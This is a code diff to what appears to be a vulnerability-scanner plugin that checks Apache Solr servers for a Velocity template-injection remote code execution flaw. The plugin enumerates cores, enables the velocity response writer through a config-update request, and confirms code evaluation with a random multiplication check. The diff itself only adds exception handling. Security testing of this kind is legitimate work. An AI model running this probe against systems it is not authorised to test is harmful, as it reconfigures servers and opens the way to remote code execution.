@@ -19,17 +19,18 @@ class Script(BaseScript):
             async with ClientSession() as session:
                 for path in [self.base_url, self.base_url + "solr/"]:
                     url = path + 'admin/cores?wt=json'
-                    async with session.get(url=url, allow_redirects=False) as res:
-                        if res and res.status == 200:
-                            text = await res.text()
-                            if 'responseHeader' in text:
-                                matchObj = re.search(r'"name":"(?P<core>.*?)"', text)
-                                if matchObj:
-                                    name = matchObj.group(1)
-                                    headers = {'Content-Type': 'application/json'}
-                                    ran1 = random.randint(100, 999)
-                                    ran2 = random.randint(100, 999)
-                                    data = '''{
+                    try:
+                        async with session.get(url=url, allow_redirects=False) as res:
+                            if res and res.status == 200:
+                                text = await res.text()
+                                if 'responseHeader' in text:
+                                    matchObj = re.search(r'"name":"(?P<core>.*?)"', text)
+                                    if matchObj:
+                                        name = matchObj.group(1)
+                                        headers = {'Content-Type': 'application/json'}
+                                        ran1 = random.randint(100, 999)
+                                        ran2 = random.randint(100, 999)
+                                        data = '''{
 "update-queryresponsewriter": {
     "startup": "test",
     "name": "velocity",
@@ -48,4 +49,5 @@ class Script(BaseScript):
                                                 text2 = await res2.text()
                                                 if str(ran1 * ran2) in text2:
                                                     yield url
-                                                    
+                    except:
+                        pass
